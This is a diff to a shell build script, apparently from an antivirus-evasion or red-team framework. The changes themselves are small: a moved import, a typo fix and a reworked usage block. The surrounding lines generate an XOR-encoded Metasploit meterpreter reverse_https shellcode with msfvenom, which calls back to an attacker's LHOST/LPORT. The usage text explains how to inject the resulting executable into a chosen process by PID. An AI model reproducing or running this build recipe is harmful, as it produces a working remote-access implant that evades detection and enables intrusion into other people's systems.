@@ -16,6 +16,9 @@ cat banner.txt
 # or enter $win64_compiler="mycompiler" here
 . build/global_win64.sh
 
+# import feature construction interface
+. build/feature_construction.sh
+
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
@@ -33,9 +36,6 @@ generate_key preset aabbcc12de input/key_raw.txt
 enable_debug_print
 #CONFIGURATION_END
 
-
-# import feature construction interface
-. build/feature_construction.sh
 
 # generate metasploit payload that will later be injected into the target process
 msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -f raw -a x64 --platform Windows > input/sc_raw.txt
@@ -76,22 +76,13 @@ strip output/injectshc_targetfromcmd_fopen_gethostbyname_xor_revhttps_win64.exe
 # cleanup
 cleanup_techniques
 
+
 echo "
 # Usage example of generated injectshc_targetfromcmd_fopen_gethostbyname_xor_revhttps_win64.exe:
 #
 # injectshc_targetfromcmd_fopen_gethostbyname_xor_revhttps_win64.exe first second 480
 #
-# The first and second command line parameters can be arbitrary strings, as they are not used. We hust need the third command line parameter.
-#
-# Use the third parameter to specify the PID of the process you want to inject your payload into."
-
-
-#USAGE_START
-# Usage example of generated injectshc_targetfromcmd_fopen_gethostbyname_xor_revhttps_win64.exe:
-#
-# injectshc_targetfromcmd_fopen_gethostbyname_xor_revhttps_win64.exe first second 480
-#
-# The first and second command line parameters can be arbitrary strings, as they are not used. We hust need the third command line parameter.
+# The first and second command line parameters can be arbitrary strings, as they are not used. We just need the third command line parameter.
 #
 # Use the third parameter to specify the PID of the process you want to inject your payload into.
-#USAGE_END
+"
